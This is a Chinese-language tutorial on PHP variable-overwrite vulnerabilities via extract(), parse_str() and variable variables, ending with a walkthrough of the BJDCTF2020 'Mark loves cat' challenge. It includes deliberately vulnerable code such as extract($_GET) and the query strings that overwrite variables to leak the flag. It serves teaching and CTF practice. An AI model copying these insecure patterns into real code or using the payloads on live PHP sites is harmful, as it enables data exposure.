> 变量覆盖漏洞是指攻击者使用自定义的变量去覆盖源代码中的变量,从而改变代码逻辑,实现攻击目的的一种漏洞

1. `extract`函数使用不当

`extract`从数组中将变量导入到当前的符号表

>**警告** 不要对不可信的数据使用`extract`,类似用户输入(例如`$_GET`,`$_FILES`)

```php
<?php
    $a=1;
    var_dump($a);
    $b=array('a'=>3);
    extract($b);
    var_dump($a);
	/*int(1)
	int(3)*/
?>
```

```php
<?php
    include("flag.php");
    $a=NULL;
    $b=file_get_contents("flag.php");
    extract($_GET);
    if($a===$b){
        var_dump($flag);
    }
?>
```

`?a=123&b=123`

2. `parse_str`函数使用不当

`parse_str`将字符串解析成多个变量

`parse_str ( string $string , array &$result ) : void`

如果`string`是URL传递入的查询字符串,则将它解析为变量并设置到当前作用域(如果提供了`result`则会设置到该数组里)

```php
<?php
    $a=1;
    var_dump($a);
    parse_str("a=3");
    var_dump($a);
	/*int(1)
    string(1) "3"*/
?>
```

3. `$$`可变变量

```php
<?php
    $a=1;
    $b="a";
    $c="b";
    $d="c";
    var_dump($d);
    var_dump($$d);
    var_dump($$$d);
    var_dump($$$$d);
?>
```

```
string(1) "c"
string(1) "b"
string(1) "a"
int(1)
```

> [BJDCTF2020]Mark loves cat

```php
<?php
include 'flag.php';
$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}
foreach($_GET as $x => $y){
    $$x = $$y;
}
foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
echo "the flag is: ".$flag;
```

假设通过`exit($handsome)`getflag,那么`$handsome=$flag`

通过get传参`handsome=flag&flag=handsome`同时满足`$x=handsome,$y=flag,$$x=$handsome,$$y=$flag`和`$_GET['flag'] === $x && $x !== 'flag'`,即可getflag

---

假设通过`exit($yds)`getflag,那么`$yds=$flag`

通过get传参`yds=flag`可以满足`$x=yds,$y=flag,$$x=$yds,$$y=$flag`,即可getflag